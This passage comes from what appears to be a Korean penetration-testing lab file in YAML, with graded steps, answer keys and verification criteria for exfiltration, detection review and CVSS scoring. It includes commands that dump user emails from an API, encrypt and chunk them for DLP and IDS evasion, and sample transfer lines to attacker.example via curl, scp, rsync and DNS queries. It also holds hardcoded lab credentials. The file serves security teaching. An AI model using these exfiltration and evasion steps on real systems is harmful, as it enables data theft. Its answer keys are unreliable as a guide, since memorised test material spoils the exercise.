      - "데이터 추출 (API → file) — curl -s http://10.20.30.80:3000/api/Users 2>/dev/null | python3 -c \"import sys,json; [print(u['email']) for u in json.load(sys.stdin)['data']]\" > /tmp/pentest_exfil.txt 2>/dev/null; echo '[추출 데이터]'; wc -l /tmp/pentest_exfil.txt; head -5 /tmp/pentest_exfil.txt. 출력: email list. 해석: step 5 의 SQLi 결과를 /api/Users (BOLA) 로도 추출 가능. JSON → 평문 파일. 1차 stage."
      - "openssl AES-256-CBC 암호화 — openssl enc -aes-256-cbc -salt -in /tmp/pentest_exfil.txt -out /tmp/pentest_exfil.enc -pass pass:pentest2026 -pbkdf2 2>/dev/null; echo 'Exfiltration simulation:'; echo \"Data size: $(wc -c < /tmp/pentest_exfil.txt) bytes -> $(wc -c < /tmp/pentest_exfil.enc) bytes (encrypted)\"; file /tmp/pentest_exfil.enc. 출력: 원본 vs 암호화 크기. 해석: AES-256 = NSA Top Secret 등급. -salt = rainbow table 차단. -pbkdf2 = key derivation (brute force 대응). DPI 도 내용 분석 불가."
      - "전송 명령 시뮬 (실 전송 X) — echo 'Transfer command (시뮬 — 실 전송 X):'; echo '  curl -X POST -F file=@/tmp/pentest_exfil.enc http://attacker.example/collect'; echo '  rsync -avz /tmp/pentest_exfil.enc attacker@attacker.example:/exfil/'; echo '  scp /tmp/pentest_exfil.enc attacker@attacker.example:/exfil/'; echo '[모의해킹 = 가능성 입증만]'. 출력: 3 전송 명령 시뮬. 해석: 실 전송 = 외부 서버 데이터 유출 = 정통망법 §49 위반 (5년/5천). 모의해킹은 명령만 작성·실 전송 X."
      - "tar + gpg (다중 파일 + 서명) — tar czf /tmp/exfil_bundle.tar.gz /tmp/pentest_exfil.txt 2>/dev/null; gpg --batch --yes --passphrase 'pentest2026' --symmetric --cipher-algo AES256 /tmp/exfil_bundle.tar.gz 2>/dev/null; ls -l /tmp/exfil_bundle.tar.gz* 2>/dev/null; echo '[복호화]'; echo 'gpg --decrypt /tmp/exfil_bundle.tar.gz.gpg | tar xzf -'. 출력: tar.gz + gpg. 해석: tar = 다중 파일 묶음 / gpg = 비대칭/대칭 암호화. AES256 = 가장 강력. 압축 + 암호화 = 정상 zip 처럼 보임."
      - "청크 분할 (split) — split -b 1M /tmp/pentest_exfil.enc /tmp/chunk_; ls -l /tmp/chunk_* 2>/dev/null | head -5; echo '[청크별 전송]'; echo 'for c in /tmp/chunk_*; do curl -F file=@$c http://attacker/$(basename $c); sleep 60; done'; echo '[목적]'; echo '  - DLP 가 큰 파일 차단'; echo '  - 시간 분산 (sleep 60) → IDS 회피'; echo '  - 정상 트래픽 위장'. 출력: 청크 + 전송 흐름. 해석: 1M 청크 + 60초 간격 = DLP 회피. APT 의 표준 기법. T1030 Data Transfer Size Limits."
      - "DNS exfiltration (시뮬) — echo '[DNS 터널링 — 시뮬]'; echo '데이터 → base32 → DNS query'; head -c 100 /tmp/pentest_exfil.txt | base32 | tr -d '=' | head -c 50; echo; echo '[전송 명령 — 시뮬]'; echo 'for chunk in $(split data); do dig $chunk.attacker.example; done'; echo '[도구]'; echo '  iodine (https://github.com/yarrick/iodine)'; echo '  dnscat2'; echo '[탐지]'; echo '  - 비정상 도메인 빈도 (1k+ subdomain/hour)'; echo '  - DNS query 길이 분포 변화'. 출력: DNS 터널 흐름. 해석: T1048.003 / T1071.004. DNS 가 외부 통신 마지막 채널 → DLP 우회. 학생 직접 실행 X."
      - "MITRE T1041 + T1567 매핑 — echo '[MITRE Exfiltration TA0010]'; echo '  T1041 Exfiltration Over C2 Channel'; echo '  T1048 Exfiltration Over Alternative Protocol'; echo '    .001 Asymmetric Encrypted Non-C2'; echo '    .002 Asymmetric Non-C2'; echo '    .003 Unencrypted Non-C2 (FTP/HTTP)'; echo '  T1567 Exfiltration Over Web Service'; echo '    .001 Code Repository (GitHub)'; echo '    .002 Cloud Storage (S3/Drive)'; echo '    .003 Text Storage (paste.bin)'; echo '  T1030 Data Transfer Size Limits (청크)'; echo '  T1573 Encrypted Channel'. 출력: ATT&CK Exfiltration. 해석: 본 step = T1041 (curl POST) + T1573.001 (AES256). 학생이 보고서 표준 ID 인용."
      - "탐지 — DLP + 네트워크 모니터링 — echo '[DLP (Data Loss Prevention)]'; echo '  Symantec DLP / Forcepoint / Trellix'; echo '  - 정규식 (주민번호/카드번호)'; echo '  - 파일 크기 / 빈도'; echo '  - 정책 위반 시 차단'; echo '[Network]'; echo '  - Suricata: outbound 비정상 트래픽 (sid:2025033)'; echo '  - Zeek: HTTP POST 큰 body'; echo '  - NetFlow: 비정상 outbound 볼륨'; echo '[방어]'; echo '  - egress filtering (allow-list)'; echo '  - DNS over HTTPS 차단 (CDN 만 허용)'; echo '  - PCI 데이터 token화'. 출력: 3 layer 탐지. 해석: 운영 환경 = DLP + Suricata + egress allowlist. 본 lab 의 Suricata 가 전송 명령 탐지."
      negative_signs:
      - 데이터 추출 (API/SQLi) → 파일 누락
      - openssl AES-256 암호화 X
      - 원본 vs 암호화 크기 비교 누락
      - 전송 명령 (curl/rsync/scp) 시뮬 X
      - tar+gpg / 청크 분할 / DNS 변형 1개 미만
      - MITRE T1041 / T1048 / T1567 매핑 X
      - DLP / Suricata 탐지 누락
      - 실 외부 전송 시도 (정통망법 위반)
  target_vm: attacker
- order: 10
  instruction: 'Phase 6 - 은닉 확인: Suricata와 Wazuh에서 본 모의해킹 활동이 탐지되었는지 확인하라.'
  hint: secu와 siem 서버의 로그를 확인한다
  category: analysis
  points: 10
  answer: '🖥️ UI: Wazuh Dashboard(https://SIEM_IP:443) 접속 → 해당 메뉴 확인

    📎 참고 (CLI): echo ''=== Suricata Alerts ==='' && ssh ccc@10.20.30.1 ''tail -10 /var/log/suricata/fast.log
    2>/dev/null'' 2>/dev/null && echo ''=== Wazuh Alerts ==='' && sshpass -p1 ssh -o StrictHostKeyChecking=no
    ccc@10.20.30.100 ''tail -10 /var/ossec/logs/alerts/alerts.log 2>/dev/null'' 2>/dev/null'
  answer_detail: 모의해킹 후 보안 장비의 탐지 여부를 확인하면 방어 체계의 효과를 평가할 수 있다. 탐지되지 않은 공격은 보안 갭을 의미하며, 탐지된 공격은 방어 체계가
    작동하고 있음을 의미한다.
  verify:
    type: output_contains
    expect: ===
    field: stdout
    semantic:
      intent: Phase 6 탐지 확인 — ssh secu 'tail /var/log/suricata/fast.log' + ssh siem 'tail /var/ossec/logs/alerts/alerts.log'.
        Purple Team 검증. 미탐지 = 보안 갭 / 탐지 = 방어 동작. NIST CSF Detect 기능 평가.
      success_criteria:
      - Suricata Alerts + Wazuh Alerts 두 로그
      - === 구분자
      - 탐지/미탐지 평가 맥락
      acceptable_methods:
      - "Suricata fast.log 확인 — echo '=== Suricata Alerts ==='; ssh ccc@10.20.30.1 'sudo tail -20 /var/log/suricata/fast.log 2>/dev/null' 2>/dev/null; echo '---'; echo '[형식] timestamp [**] [GID:SID:REV] msg [**] {Proto} src:port -> dst:port'; echo '[예시 alert]'; echo '04/29/2026-14:32:18.123456 [**] [1:2010937:5] ET SCAN Suspicious inbound to 3000 [**] {TCP} 10.20.30.201:54321 -> 10.20.30.80:3000'. 출력: Suricata alert 샘플. 해석: fast.log = 즉시 alert. eve.json = 상세 (JSON). SID 2010937 = ET (Emerging Threats) ruleset."
      - "Wazuh alerts.log 확인 — echo '=== Wazuh Alerts ==='; sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.100 'tail -20 /var/ossec/logs/alerts/alerts.log 2>/dev/null' 2>/dev/null; echo '---'; echo '[Wazuh format]'; echo '** Alert 1714370738.12345: - syslog,sshd,authentication_success'; echo 'Rule: 5715 (level 3) -> SSHD authentication success'; echo 'Src IP: 10.20.30.80'; echo 'User: ccc'. 출력: Wazuh alert. 해석: alerts.log = 모든 alert 시간순. Rule ID + Level (1-15) + 분류 + decoder. 5715 = sshd: Login + 6072 = pentest detection."
      - "공격 매핑 — 어떤 alert 가 어떤 step? — printf '%-8s | %-25s | %-30s | %s\\n' 'Step' 'Phase' 'Suricata SID' 'Wazuh Rule'; printf '%-8s | %-25s | %-30s | %s\\n' '1' '정찰 (nmap)' 'ET SCAN nmap (2010937)' 'rule 533 (firewall_drop)'; printf '%-8s | %-25s | %-30s | %s\\n' '4' 'SQLi 인증 우회' 'WEB SQLi UNION (2014547)' 'rule 31103 (SQLi)'; printf '%-8s | %-25s | %-30s | %s\\n' '6' 'SSH 측면이동' 'ET SSH brute (2010935)' 'rule 5715 (sshd login)'; printf '%-8s | %-25s | %-30s | %s\\n' '8' '키 백도어' '-' 'rule 5715 + 5402 (sudo)'. 출력: 4 step 매핑. 해석: 본 lab 의 9 phase 별 어떤 보안 장비 alert 발생. 미탐지 = 보안 갭."
      - "Suricata 통계 (jq) — ssh ccc@10.20.30.1 'sudo jq -c \"select(.event_type==\\\"alert\\\")\" /var/log/suricata/eve.json 2>/dev/null | head -10' 2>/dev/null || echo '[가상] {alert: ET SCAN, src: .201, count: 23}'; echo '---'; echo '[통계 쿼리]'; echo 'jq \".alert.signature\" eve.json | sort | uniq -c | sort -rn | head -5'; echo '[가상 결과]'; echo '  87 ET SCAN nmap'; echo '  23 WEB SQLi'; echo '  12 ET SSH brute'. 출력: 통계 쿼리. 해석: eve.json = JSON 형식 → jq 로 분석. 가장 흔한 alert top-N → 공격 패턴 식별."
      - "Wazuh API 쿼리 — curl -s -k -u admin:admin 'https://10.20.30.100:55000/agents' 2>/dev/null | python3 -m json.tool 2>/dev/null | head -20 || echo '[가상] {agents: [{id: 001, name: web, ip: 10.20.30.80, status: active}]}'; echo '---'; echo '[Alert 검색]'; echo 'curl -s -k -u admin:admin \"https://10.20.30.100:55000/security/alerts?pretty&limit=5\"'; echo '[Wazuh Dashboard]'; echo '  https://10.20.30.100:443 (admin/admin)'; echo '  Discover → 시간 필터 → 검색'. 출력: Wazuh API + UI. 해석: REST API 로 자동화 가능. UI 는 분석가용. 본 lab 의 Wazuh = SIEM 표준."
      - "Purple Team 검증 매트릭스 — printf '%-15s | %-12s | %s\\n' 'Phase' '탐지' '평가'; printf '%-15s | %-12s | %s\\n' '1 정찰' 'YES' 'Suricata 87 alerts ✓'; printf '%-15s | %-12s | %s\\n' '2 웹 정찰' 'PARTIAL' 'Apache log only'; printf '%-15s | %-12s | %s\\n' '3 취약점 스캔' 'YES' 'Nikto 시그니처 ✓'; printf '%-15s | %-12s | %s\\n' '4 SQLi 우회' 'YES' 'WAF + Wazuh ✓'; printf '%-15s | %-12s | %s\\n' '5 데이터 추출' 'NO' '⚠️ 보안 갭'; printf '%-15s | %-12s | %s\\n' '6 측면이동' 'YES' 'auth.log + 5715'; printf '%-15s | %-12s | %s\\n' '8 백도어' 'NO' '⚠️ 보안 갭'; printf '%-15s | %-12s | %s\\n' '9 데이터 유출' 'PARTIAL' 'DLP 미배포'. 출력: 9 phase 매트릭스. 해석: Purple Team = Red + Blue 협업. 미탐지 = 보안 갭 → 시그니처 추가 의무."
      - "MITRE D3FEND + NIST CSF Detect — echo '[MITRE D3FEND — Defensive ATT&CK]'; echo '  D3-NTA Network Traffic Analysis (Suricata)'; echo '  D3-FA File Analysis (Wazuh fim)'; echo '  D3-PA Process Analysis'; echo '[NIST CSF Detect (DE)]'; echo '  DE.AE Anomalies and Events'; echo '  DE.CM Continuous Monitoring (Wazuh)'; echo '  DE.DP Detection Processes'; echo '[ATT&CK Datasource]'; echo '  Network Traffic / Process / File / Authentication'. 출력: D3FEND + CSF. 해석: 공격 (ATT&CK) ↔ 방어 (D3FEND) 매핑. 본 lab 의 Suricata+Wazuh = 표준 detection layer."
      - "갭 분석 + 시그니처 추가 — echo '[발견 갭]'; echo '1. Phase 5 (UNION SQLi 데이터 추출) → 시그니처 X'; echo '2. Phase 8 (SSH 키 백도어) → authorized_keys 변경 미감지'; echo '3. Phase 9 (Exfil) → DLP 미배포'; echo '[추가 시그니처]'; cat <<'EOF'\\n# Suricata custom rule\\nalert http any any -> any any (msg:\"SQLi UNION SELECT\"; flow:established,to_server; pcre:\"/UNION\\\\s+SELECT/i\"; sid:9000001;)\\n# Wazuh local_rules.xml\\n<rule id=\"100100\" level=\"10\">\\n  <decoded_as>auditd</decoded_as>\\n  <field name=\"key\">authorized_keys_change</field>\\n  <description>SSH key backdoor detection</description>\\n</rule>\\nEOF. 출력: 갭 + 시그니처. 해석: 본 lab 의 학습 결과 = 자사 SOC 시그니처 추가 자료."
      negative_signs:
      - 단일 로그만
      - 탐지 평가 없음
      - Purple Team 맥락 없음
  target_vm: attacker
- order: 11
  instruction: 'Phase 7 - 취약점 분류: 발견된 모든 취약점을 CVSS 점수로 평가하고 위험도를 분류하라.'
  hint: 각 취약점에 CVSS 3.1 벡터 문자열을 할당한다
  category: analysis
  points: 10
  answer: 'echo -e ''=== Vulnerability Classification ===\n\n| # | Vulnerability | CVSS | Severity | OWASP
    |\n|---|-------------|------|----------|-------|\n| 1 | SQL Injection (login bypass) | 9.8 | Critical
    | A03 |\n| 2 | UNION SQLi (data extraction) | 9.1 | Critical | A03 |\n| 3 | User data API exposure
    | 7.5 | High | A01 |\n| 4 | Credential reuse (SSH) | 8.1 | High | A07 |\n| 5 | Missing rate limiting
    | 7.3 | High | A07 |\n| 6 | XSS (Reflected) | 6.1 | Medium | A03 |\n| 7 | Directory listing (/ftp)
    | 5.3 | Medium | A05 |\n| 8 | Missing security headers | 5.0 | Medium | A05 |\n| 9 | Version info
    disclosure | 5.0 | Medium | A05 |\n| 10 | Verbose error messages | 4.3 | Medium | A05 |'''
  answer_detail: CVSS(Common Vulnerability Scoring System) 3.1은 취약점의 심각도를 0~10 점수로 표현한다. Critical(9.0-10.0),
    High(7.0-8.9), Medium(4.0-6.9), Low(0.1-3.9)으로 분류하며, 공격 벡터, 복잡도, 영향도를 종합적으로 고려한다.
  verify:
    type: output_contains
    expect: Vulnerability Classification
    field: stdout
    semantic:
      intent: Phase 7 CVSS 분류 — 10개 취약점 + CVSS 3.1 점수 + Severity(Critical 9.0+/High 7.0+/Medium 4.0+/Low
        0.1+) + OWASP 카테고리. SQLi 9.8/UNION 9.1/Cred Reuse 8.1/XSS 6.1 등. FIRST.org CVSS 3.1 사양.
      success_criteria:
      - Vulnerability Classification 키워드
      - CVSS + Severity + OWASP 매핑
      - 취약점 5개 이상
      acceptable_methods:
      - "CVSS 3.1 vector + 점수 — echo '[CVSS 3.1 vector 형식]'; echo 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 Critical'; echo '---'; echo '[8 metric]'; echo '  AV (Attack Vector): N=Network L=Local A=Adjacent P=Physical'; echo '  AC (Complexity): L=Low H=High'; echo '  PR (Privileges Required): N=None L=Low H=High'; echo '  UI (User Interaction): N=None R=Required'; echo '  S (Scope): U=Unchanged C=Changed'; echo '  C/I/A (Confidentiality/Integrity/Availability): N/L/H'. 출력: vector + 8 metric. 해석: FIRST.org CVSS 3.1 사양. SQLi = AV:N (원격) + AC:L (간단) + PR:N (인증 X) + 영향 H = 9.8."
      - "취약점 분류표 (10 vuln) — cat <<'EOF' > /tmp/vuln_classification.csv\\n#,Vulnerability,CVSS,Severity,OWASP,CWE,Source\\n1,SQL Injection (login bypass),9.8,Critical,A03,CWE-89,manual\\n2,UNION SQLi (data extraction),9.1,Critical,A03,CWE-89,manual\\n3,User data API exposure (BOLA),7.5,High,A01,CWE-862,nuclei\\n4,Credential reuse (SSH),8.1,High,A07,CWE-521,manual\\n5,Missing rate limiting,7.3,High,A07,CWE-307,Nikto\\n6,XSS (Reflected),6.1,Medium,A03,CWE-79,nuclei\\n7,Directory listing (/ftp),5.3,Medium,A05,CWE-548,Nikto\\n8,Missing security headers,5.0,Medium,A05,CWE-693,Nikto+nuclei\\n9,Version info disclosure,5.0,Medium,A05,CWE-200,Nikto\\n10,Verbose error messages,4.3,Medium,A05,CWE-209,manual\\nEOF\\necho '[Vuln Classification 10 entries]'; cat /tmp/vuln_classification.csv | column -t -s ','. 출력: 10 vuln 표. 해석: 7 컬럼 표준 (CVSS+OWASP+CWE+Source). step 3 (Phase 2 스캔) 결과 통합."
      - "Severity 분류 (Critical/High/Medium/Low) — printf '%-12s | %-10s | %-15s | %s\\n' 'Severity' 'CVSS' '대응 기간' '예시'; printf '%-12s | %-10s | %-15s | %s\\n' 'Critical' '9.0-10.0' '1일 ~ 1주' 'SQLi/RCE'; printf '%-12s | %-10s | %-15s | %s\\n' 'High' '7.0-8.9' '1주 ~ 1개월' 'BOLA/Cred 재사용'; printf '%-12s | %-10s | %-15s | %s\\n' 'Medium' '4.0-6.9' '1 ~ 3개월' 'XSS/헤더'; printf '%-12s | %-10s | %-15s | %s\\n' 'Low' '0.1-3.9' '3 ~ 6개월' '버전 노출'; printf '%-12s | %-10s | %-15s | %s\\n' 'None' '0' '-' '-'. 출력: 5 등급. 해석: NIST SP 800-30 + FIRST CVSS 3.1. 등급별 SLA 정의."
      - "OWASP Top 10 2021 매핑 — echo '[OWASP Top 10 2021]'; echo '  A01:2021 Broken Access Control (#1)'; echo '  A02:2021 Cryptographic Failures'; echo '  A03:2021 Injection (#3)'; echo '  A04:2021 Insecure Design'; echo '  A05:2021 Security Misconfiguration'; echo '  A06:2021 Vulnerable Components'; echo '  A07:2021 Identification & Authentication'; echo '  A08:2021 Software & Data Integrity'; echo '  A09:2021 Security Logging Failures'; echo '  A10:2021 SSRF'; echo '[본 lab 매핑]'; echo '  A01: 3건 (BOLA / 권한)'; echo '  A03: 3건 (SQLi×2 / XSS)'; echo '  A05: 4건 (헤더/dir/version/error)'. 출력: 매핑. 해석: OWASP Top 10 = 가장 흔한 웹 취약점 분류. 본 lab 발견 = A01/A03/A05/A07 4 카테고리."
      - "CVSS Calculator 수동 산출 — echo '[CVSS Calculator]'; echo '  https://www.first.org/cvss/calculator/3.1'; echo '[명령 산출]'; python3 -c \"\\nbase_metrics = {'AV':{'N':0.85,'A':0.62,'L':0.55,'P':0.2}, 'AC':{'L':0.77,'H':0.44}, 'PR':{'N':0.85,'L':0.62,'H':0.27}, 'UI':{'N':0.85,'R':0.62}}\\nimpact_C = impact_I = impact_A = 0.56  # H\\nimpact_sub = 1 - (1-impact_C)*(1-impact_I)*(1-impact_A)\\nimpact = 6.42 * impact_sub  # Scope U\\nexploit = 8.22 * 0.85 * 0.77 * 0.85 * 0.85  # AV:N AC:L PR:N UI:N\\nbase = round(min(impact + exploit, 10), 1)\\nprint(f'CVSS Base Score: {base}')\". 출력: 9.8 계산. 해석: 수동 계산 가능 = CVSS 이해 검증. 운영은 calculator UI 사용."
      - "CWE (Common Weakness Enumeration) — echo '[CWE Top 25 2024]'; echo '  CWE-79 Cross-site Scripting (XSS)'; echo '  CWE-89 SQL Injection'; echo '  CWE-307 Improper Restriction of Excessive Auth Attempts'; echo '  CWE-200 Information Exposure'; echo '  CWE-862 Missing Authorization'; echo '  CWE-521 Weak Password Requirements'; echo '[본 lab CWE]'; echo '  Critical: CWE-89 (SQLi)'; echo '  High: CWE-862 (BOLA), CWE-521 (Cred reuse), CWE-307 (rate limit)'; echo '  Medium: CWE-79 (XSS), CWE-548, CWE-693, CWE-200, CWE-209'. 출력: CWE 매핑. 해석: CVSS = 점수 / CWE = 분류. CVE 발급 시 CWE 필수."
